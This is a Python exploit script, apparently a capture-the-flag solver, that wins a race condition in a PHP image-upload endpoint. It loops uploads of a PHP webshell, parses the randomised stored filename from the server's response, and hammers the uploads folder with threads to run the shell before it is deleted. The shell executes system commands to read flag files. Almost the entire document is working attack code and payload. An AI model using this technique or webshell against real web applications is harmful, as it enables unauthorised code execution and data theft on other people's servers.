#!/usr/bin/env python3
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

import requests


class RaceConditionExploit:


    UPLOAD_DELAY = 0.05
    ACCESS_DELAY = 0.01
    DEFAULT_THREADS = 30
    DEFAULT_TIMEOUT = 60
    UPLOAD_WORKER_COUNT = 5

    def __init__(self, target_url):
        """Initialize the exploit with target URL."""
        self.target_url = target_url.rstrip('/')
        self.upload_url = f"{self.target_url}/upload.php"
        self.session = requests.Session()
        self.current_filename = None
        self.lock = threading.Lock()
        self.success = False

    def create_payload(self):
        """Create PHP webshell payload."""
        return """<?php
echo "<pre>";
system("cat /flag* 2>/dev/null");
system("cat flag* 2>/dev/null");
echo "</pre>";
?>"""

    def upload_file(self, base_filename, content):
        """Upload file and extract actual filename from response."""
        files = {'imageFile': (base_filename, content, 'application/octet-stream')}
        data = {'submit': 'Upload'}

        try:
            response = self.session.post(
                self.upload_url,
                files=files,
                data=data,
                allow_redirects=True,
                timeout=10
            )

            # Extract actual filename with random prefix from response
            # Response format: "Success: File uploaded as a3f9c812_shell.php"
            match = re.search(r'uploaded as ([a-f0-9]{8}_[^\s<]+)', response.text)
            if match:
                with self.lock:
                    self.current_filename = match.group(1)
                    print(f"[+] Uploaded as: {self.current_filename}")
                return True

            return False

        except Exception as e:
            print(f"[!] Upload error: {e}")
            return False

    def access_file(self, filename):
        """Attempt to access uploaded file."""
        if not filename:
            return False, None

        file_url = f"{self.target_url}/uploads/{filename}"

        try:
            response = self.session.get(file_url, timeout=5)
            if response.status_code == 200 and "<pre>" in response.text:
                return True, response.text
            return False, response.text

        except Exception as e:
            return False, str(e)

    def upload_worker(self, base_filename, payload):
        """Worker thread for continuous uploading."""
        while not self.success:
            self.upload_file(base_filename, payload)
            time.sleep(self.UPLOAD_DELAY)

    def access_worker(self):
        """Worker thread for continuous access attempts."""
        while not self.success:
            with self.lock:
                filename = self.current_filename

            if filename:
                result, content = self.access_file(filename)
                if result:
                    self._print_success(content)
                    self.success = True
                    return

            time.sleep(self.ACCESS_DELAY)

    def _print_success(self, content):
        """Print success message with content."""
        separator = '=' * 60
        print(f"\n{separator}")
        print("[+] SUCCESS! Race condition exploited!")
        print(separator)
        print(content)
        print(separator)

    def race_attack(self, base_filename="shell.php", num_threads=None, timeout=None):
        """Execute race condition attack."""
        num_threads = num_threads or self.DEFAULT_THREADS
        timeout = timeout or self.DEFAULT_TIMEOUT

        payload = self.create_payload()
        self._print_attack_info(num_threads, timeout, base_filename)

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            # Start upload worker threads
            for _ in range(self.UPLOAD_WORKER_COUNT):
                executor.submit(self.upload_worker, base_filename, payload)

            # Start access worker threads
            for _ in range(num_threads - self.UPLOAD_WORKER_COUNT):
                executor.submit(self.access_worker)

            # Wait for success or timeout
            start_time = time.time()
            while not self.success and (time.time() - start_time) < timeout:
                time.sleep(0.1)

            if not self.success:
                print("\n[-] Timeout reached. Attack failed.")
                print("[!] Try increasing threads or timeout")
                return False

            return True

    def _print_attack_info(self, num_threads, timeout, base_filename):
        """Print attack configuration information."""
        print(f"[*] Starting race condition attack on {self.target_url}")
        print(f"[*] Using {num_threads} threads")
        print(f"[*] Timeout: {timeout} seconds")
        print(f"[*] Base filename: {base_filename}")
        print("-" * 60)


def main():
    """Main entry point for the exploit script."""
    if len(sys.argv) < 2:
        print("Usage: python3 solver.py <target_url> [threads] [timeout]")
        print("Example: python3 solver.py http://localhost:6005")
        print("         python3 solver.py http://localhost:6005 50 90")
        sys.exit(1)

    target_url = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else None
    timeout = int(sys.argv[3]) if len(sys.argv) > 3 else None

    exploit = RaceConditionExploit(target_url)
    success = exploit.race_attack(num_threads=threads, timeout=timeout)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
